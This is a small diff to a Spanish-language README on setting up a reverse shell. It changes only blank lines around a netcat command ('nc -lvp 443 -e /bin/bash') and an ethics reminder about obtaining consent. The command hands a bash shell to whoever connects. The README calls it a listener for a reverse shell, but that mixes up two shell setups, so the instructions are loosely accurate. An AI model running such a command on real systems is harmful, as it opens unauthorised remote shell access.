@@ -19,7 +19,8 @@ Este README proporciona instrucciones sobre cómo configurar una reverse shell d
 # Configura un listener para recibir la conexión entrante en el puerto 443:
 
 - nc -lvp 443  -e /bin/bash
-- 
+
 # Notas importantes:
+
 Asegúrate de tener permisos adecuados y contar con el consentimiento del propietario del sistema antes de realizar este tipo de acciones.
 La seguridad ética y responsable es esencial en todas las actividades relacionadas con la seguridad informática.
